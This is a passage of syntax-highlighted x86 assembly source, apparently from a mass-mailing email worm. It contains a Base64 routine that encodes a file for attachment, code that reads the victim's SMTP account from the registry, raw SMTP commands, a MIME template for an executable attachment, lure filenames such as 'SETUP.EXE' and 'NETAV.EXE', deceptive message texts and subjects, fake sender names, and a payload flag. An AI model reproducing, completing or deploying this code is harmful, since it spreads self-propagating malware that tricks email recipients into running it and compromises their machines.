    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OurSizeToEncode</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">; We need ori size *3 (+security)</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">                      </span><span class="sc1">; read/write page</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">; System decide where </span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">VirtualAlloc</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CodeB64FileEnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">MemEncoded</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">AlignFileToEncodeSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OurSizeToEncode</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                        
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; align size to 3</span><span class="sc0">

</span><span class="sc5">EncodeFileNow</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MemEncoded</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MemToEncode</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">encodeBase64</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncodedFileSize</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    
</span><span class="sc5">CodeB64FileEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;................... Encode Base 64 Algorithme ...............................</span><span class="sc0">

</span><span class="sc5">encodeBase64</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; By Bumblebee</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;               EAX = Address of data to encode</span><span class="sc0">
</span><span class="sc1">;               EDX = Address to put encoded data</span><span class="sc0">
</span><span class="sc1">;               ECX = Size of data to encode</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;               ECX = size of encoded data</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">over_enc_table</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc3">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc3">"abcdefghijklmnopqrstuvwxyz"</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc3">"0123456789+/"</span><span class="sc0">
</span><span class="sc5">over_enc_table</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">ebp</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">baseLoop</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">movzx</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">shr</span><span class="sc0">       </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0">       </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0">      </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
      </span><span class="sc6">shr</span><span class="sc0">       </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0">       </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0">      </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
      </span><span class="sc6">shr</span><span class="sc0">       </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0">       </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">movzx</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0">       </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">ebp</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
      </span><span class="sc6">jna</span><span class="sc0">       </span><span class="sc5">DontAddEndOfLine</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0A0Dh</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                          
      </span><span class="sc9">org</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">DontAddEndOfLine</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">ebp</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc5">baseLoop</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">ebp</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;------------------------------ Data Zone ------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">


</span><span class="sc1">;-------------------------- Variables Zone -----------------------------------</span><span class="sc0">

</span><span class="sc5">SmtpFlag</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Select Mapi or Smtp</span><span class="sc0">
</span><span class="sc5">PayloadFlag</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Payload = 1</span><span class="sc0">
</span><span class="sc5">UserEmailFoundFlag</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; found = 1</span><span class="sc0">

</span><span class="sc1">;...................... Encode B64 Variables</span><span class="sc0">

</span><span class="sc5">EncodedFileSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MemEncoded</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MemToEncode</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OurSizeToEncode</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ByteReaded</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;...................... Email SMTP Variables</span><span class="sc0">

</span><span class="sc5">Reg</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; String </span><span class="sc0">
</span><span class="sc5">KeySize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Size to read with SHGetValue </span><span class="sc0">
                                        </span><span class="sc1">; (init it + return effectiv lenght read in)</span><span class="sc0">

</span><span class="sc5">AccountKey</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc13">'Software\Microsoft\Internet Account Manager\Accounts\'
</span><span class="sc5">AccountSubKey</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SmtpServeur</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; smtp server found with regkey</span><span class="sc0">


</span><span class="sc5">wsocket</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; sin_family ever AF_INET</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; the port</span><span class="sc0">
</span><span class="sc5">ServeurIP</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; addr of server node</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; not used </span><span class="sc0">


</span><span class="sc5">hSocket</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; Socket Handle   </span><span class="sc0">

</span><span class="sc5">ServeurReply</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; error code</span><span class="sc0">
</span><span class="sc5">ServeurReplyEnd</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; byte for LF</span><span class="sc0">


</span><span class="sc5">CRLF</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">&gt;</span><span class="sc0">
    
</span><span class="sc5">cmd_helo</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'HELO Support'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">cmd_mailfrom</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MAIL FROM:&lt;'</span><span class="sc0">
</span><span class="sc5">cmd_rcptto</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'RCPT TO:&lt;'</span><span class="sc0">

</span><span class="sc5">cmd_data</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'DATA'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">cmd_term</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">cmd_quit</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'QUIT'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">


</span><span class="sc5">MemMessageBody1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Ptr on Mem where built header</span><span class="sc0">
</span><span class="sc5">MessageSize1</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Size Header + bordel Mime</span><span class="sc0">

</span><span class="sc5">MessageBody1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Mime-Version: 1.0'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: multipart/mixed; boundary="--123"'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'----123'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: text/plain; charset=us-ascii'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Transfer-Encoding: 7bit'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc1">;   Text part</span><span class="sc0">

</span><span class="sc5">MessageBody1b</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'----123'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Content-Type: application/octet-stream; name='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; filename part</span><span class="sc0">
</span><span class="sc5">MessageBody1c</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Content-Transfer-Encoding: base64'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Content-Disposition: attachment; filename='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; filename part</span><span class="sc0">

            </span><span class="sc1">;   Encoded part</span><span class="sc0">

</span><span class="sc5">MessageBody2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'--123--'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">MessageSize2</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MessageBody2</span><span class="sc0">


</span><span class="sc5">RndFileName1</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'"SETUP.EXE"'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndFileName2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'"HGAME.EXE"'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndFileName3</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'"MININET.EXE"'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndFileName4</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'"NETAV.EXE"'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndFileNameTb</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFileName1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFileName4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFileName3</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFileName4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFileName2</span><span class="sc0">
</span><span class="sc5">NbRndFileName</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFileNameTb</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0"> 

</span><span class="sc5">RndText1</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Hi '</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Here is what you asked, bye. '</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndText2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Hello '</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Maybe you could help me with this, bye. '</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndText3</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Hello '</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Now you can try it, bye. '</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">RndTextTb</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndText1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndText2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndText3</span><span class="sc0">
</span><span class="sc5">NbRndText</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndTextTb</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">RndSubject1</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Hello'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndSubject2</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'For you'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndSubject3</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Try it'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndSubject4</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Re:'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndSubjectTb</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndSubject2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndSubject1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndSubject4</span><span class="sc0">  
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndSubject3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndSubject4</span><span class="sc0">
</span><span class="sc5">NbSubject</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndSubjectTb</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">RndFromName1</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'morgan'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndFromName2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'mick'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndFromName3</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'carla'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndFromName4</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'eva'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
